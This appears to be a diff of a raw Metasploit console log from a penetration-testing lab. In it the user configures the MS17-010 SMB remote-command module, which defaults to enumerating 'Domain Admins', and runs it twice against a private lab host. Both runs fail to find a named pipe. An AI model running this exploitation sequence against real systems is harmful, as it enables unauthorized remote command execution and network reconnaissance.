@@ -5995,4 +5995,46 @@ Matching Modules
    4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
 
 
-[4mmsf5[0m [0m>  [K [K| [K [K[K [K [K [K
+[4mmsf5[0m [0m>  [K [K| [K [K[K [K [K [Kuse exploit/windows/sm[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Kauxiliary/admin/smb/ms17_010_command 
+[0m[4mmsf5[0m auxiliary([1m[31madmin/smb/ms17_010_command[0m) [0m> swo[K[K[KInterrupt: use the 'exit' command to quit
+[4mmsf5[0m auxiliary([1m[31madmin/smb/ms17_010_command[0m) [0m> [K[4mmsf5[0m auxiliary([1m[31madmin/smb/ms17_010_command[0m) [0m> show options 
+[0m
+Module options (auxiliary/admin/smb/ms17_010_command):
+
+   Name                  Current Setting                                                 Required  Description
+   ----                  ---------------                                                 --------  -----------
+   COMMAND               net group "Domain Admins" /domain                               yes       The command you want to execute on the remote host
+   DBGTRACE              false                                                           yes       Show extra debug trace info
+   LEAKATTEMPTS          99                                                              yes       How many times to try to leak transaction
+   NAMEDPIPE                                                                             no        A named pipe that can be connected to (leave blank for auto)
+   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
+   RHOSTS                                                                                yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT                 445                                                             yes       The Target port
+   SERVICE_DESCRIPTION                                                                   no        Service description to to be used on target for pretty listing
+   SERVICE_DISPLAY_NAME                                                                  no        The service display name
+   SERVICE_NAME                                                                          no        The service name
+   SMBDomain             .                                                               no        The Windows domain to use for authentication
+   SMBPass                                                                               no        The password for the specified username
+   SMBSHARE              C$                                                              yes       The name of a writeable share on the server
+   SMBUser                                                                               no        The username to authenticate as
+   THREADS               1                                                               yes       The number of concurrent threads (max one per host)
+   WINPATH               WINDOWS                                                         yes       The name of the remote Windows directory
+
+[4mmsf5[0m auxiliary([1m[31madmin/smb/ms17_010_command[0m) [0m>  [K [K[K[4mmsf5[0m auxiliary([1m[31madmin/smb/ms17_010_command[0m) [0m> [K[4mmsf5[0m auxiliary([1m[31madmin/smb/ms17_010_command[0m) [0m> [K[4mmsf5[0m auxiliary([1m[31madmin/smb/ms17_010_command[0m) [0m>  [K [K [Krh[K[Kset rhosts [K [K[Ks[K [K [K [Ks 10.10.208.123
+[0mrhosts => 10.10.208.123
+[4mmsf5[0m auxiliary([1m[31madmin/smb/ms17_010_command[0m) [0m> run
+[0m
+[1m[34m[*][0m 10.10.208.123:445     - Target OS: Windows 7 Professional 7601 Service Pack 1
+[1m[31m[-][0m 10.10.208.123:445     - Unable to find accessible named pipe!
+[1m[34m[*][0m 10.10.208.123:445     - Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m Auxiliary module execution completed
+[4mmsf5[0m auxiliary([1m[31madmin/smb/ms17_010_command[0m) [0m>  [K [Ksew[K[K[Kget Rg[KHOSTS 
+[0mRHOSTS => 10.10.208.123
+[4mmsf5[0m auxiliary([1m[31madmin/smb/ms17_010_command[0m) [0m> run
+[0m
+[1m[34m[*][0m 10.10.208.123:445     - Target OS: Windows 7 Professional 7601 Service Pack 1
+[1m[31m[-][0m 10.10.208.123:445     - Unable to find accessible named pipe!
+[1m[34m[*][0m 10.10.208.123:445     - Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m Auxiliary module execution completed
+[4mmsf5[0m auxiliary([1m[31madmin/smb/ms17_010_command[0m) [0m>  [K [K [K [K [K [K [K [Kexit
+[0m
